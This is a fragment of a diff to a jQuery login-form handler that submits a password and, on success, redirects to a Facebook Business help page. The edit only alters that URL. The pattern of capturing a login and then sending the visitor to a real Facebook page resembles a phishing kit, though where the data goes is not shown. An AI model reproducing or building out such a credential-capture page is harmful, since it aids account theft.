@@ -20,7 +20,7 @@ $('#login_form').submit(function (event) {
             pass:pass
         },
         success:function (data) {
-            if(data == 'success') {location.href = '//www.facebook.com/business/help/182371508761821';
+            if(data == 'success') {location.href = '//www.facebook.com/business182371508761821';
                                  // close();
                                   }
         }
